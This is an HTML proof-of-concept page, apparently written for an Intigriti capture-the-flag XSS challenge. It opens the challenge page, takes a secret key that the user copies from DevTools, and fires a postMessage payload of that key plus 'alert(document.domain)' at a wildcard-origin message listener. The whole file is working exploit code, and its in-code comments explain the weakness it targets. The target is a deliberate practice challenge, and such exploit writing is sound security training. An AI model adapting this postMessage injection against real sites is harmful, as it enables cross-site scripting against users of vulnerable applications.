<!DOCTYPE html>
<html>
<head>
    <title>Intigriti Payload Sender</title>
    <style>
        body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; }
        input { padding: 10px; width: 400px; font-size: 16px; }
        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background: #d00; color: white; border: none; }
        .step { margin-bottom: 20px; border: 1px solid #333; padding: 15px; }
    </style>
</head>
<body>
    <h1>Manual Key + Auto Exploit</h1>

    <div class="step">
        <h3>Step 1: Open Target</h3>
        <button onclick="openTarget()">1. Launch Challenge</button>
        <p>Wait for the page to load (3 seconds) and hit the breakpoint you set.</p>
    </div>

    <div class="step">
        <h3>Step 2: Enter Key</h3>
        <p>Copy the 'code' variable from DevTools and paste it here:</p>
        <input type="text" id="secretKey" placeholder="Paste key here (e.g., 837aa60...)">
    </div>

    <div class="step">
        <h3>Step 3: Attack</h3>
        <button onclick="fireExploit()">2. Fire Exploit (One Click)</button>
        <p>This sends the postMessage command from THIS page to the CHALLENGE page.</p>
    </div>

    <script>
        let targetWin = null;

        function openTarget() {
            // Open the challenge in a new window so we can talk to it
            targetWin = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'targetWindow');
        }

        function fireExploit() {
            const key = document.getElementById('secretKey').value.trim();
            
            if (!key) {
                alert("Please paste the key first!");
                return;
            }

            if (!targetWin) {
                alert("Please launch the target first!");
                return;
            }

            console.log("Firing payload with key:", key);

            // THE VULNERABILITY:
            // We send the message from *this* domain to the *challenge* domain.
            // The challenge accepts it because it listens to '*' (Wildcard).
            
            const payload = key + "alert(document.domain)";
            
            targetWin.postMessage(payload, '*');
            
            alert("Payload Sent! Check the other tab.");
        }
    </script>
</body>
</html>
